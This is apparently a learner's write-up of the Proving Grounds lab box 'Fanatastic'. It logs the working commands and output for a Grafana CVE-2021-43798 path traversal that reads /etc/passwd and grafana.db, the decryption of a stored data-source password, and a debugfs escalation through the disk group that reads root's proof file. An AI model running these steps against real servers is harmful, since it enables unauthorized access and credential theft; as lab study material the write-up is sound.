---
tags: [ProvingGround]
---

Fanatastic 6/25/25

---------------------------------

## 1. sudo nmap -p- -sC -sV -Pn -n --open 192.168.147.181 -oN nmap/initial
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry
|_/
| http-title: Grafana
|_Requested resource was /login
9090/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-title: Prometheus Time Series Collection and Processing Server
|_Requested resource was /graph
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## 2. Port 3000 investigation.
- Site is Grafana v8.3.0 landing page.
- Tried admin/admin default creds.
- Ran directory transveral exloit

/ ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ /___  / _ \ ( _ )
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \  / / (_) |/ _ \
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) |/ / \__, | (_) |
\____|  \_/  |_____|   |_____|\___/_____|_|        |_||____//_/    /_/ \___/

Coded By: K3ysTr0K3R

[*] Detecting Grafana instance
[+] Grafana detected on http://192.168.147.181:3000
[*] Proceeding with vulnerability check
[+] Detected vulnerable version: 8.3.0
[*] Shifting through plugin ids
[*] Trying plugin id: alertlist
[+] Vulnerable entry found at plugin: alertlist
[+] Dumping data please wait
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
grafana:x:113:117::/usr/share/grafana:/bin/false
prometheus:x:1000:1000::/home/prometheus:/bin/false
sysadmin:x:1001:1001::/home/sysadmin:/bin/sh

- Google'd defualt location of Grafana DB
- curl --path-as-is "http://192.168.147.181:3000/public/plugins/alertlist/../../../../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
- Opening the DB, I found the {"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="} in the data_source table.
- When googling decrypting data_source password, gound a python tool. https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798
- ┌──(Fanatastic)─(kali㉿Kali)-[~/…/Fanatastic/exploit/CVE-2021-43798-EXPLOIT/Grafana-Decryptor-for-CVE-2021-43798]
└─$ python3 decrypt.py

######################################
GRAFANA DECRYPTOR
CVE-2021-43798 Grafana Unauthorized
arbitrary file reading vulnerability
SICARI0
######################################

? Enter the datasource password: anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
[*] DataSourcePassword= anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
[*] plainText= SuperSecureP@ssw0rd
- Ran linpeas.sh and received this uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
- sysadmin@fanatastic:~$ debugfs /dev/sda2
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cd /root
debugfs:  ls
WARNING: terminal is not fully functional
-  (press RETURN)debugfs:
debugfs:  cat proof.txt
57aecc3bfe4b1d4c4c1ab21528b8b4a3
debugfs:


## 3. Port 9090 investigation.
- curl http://192.168.147.181:9090/version
{"version":"2.32.1","revision":"41f1a8125e664985dd30674e5bdf6b683eff5d32","branch":"HEAD","buildUser":"root@54b6dbd48b97","buildDate":"20211217-22:08:06","goVersion":"go1.17.5"}
-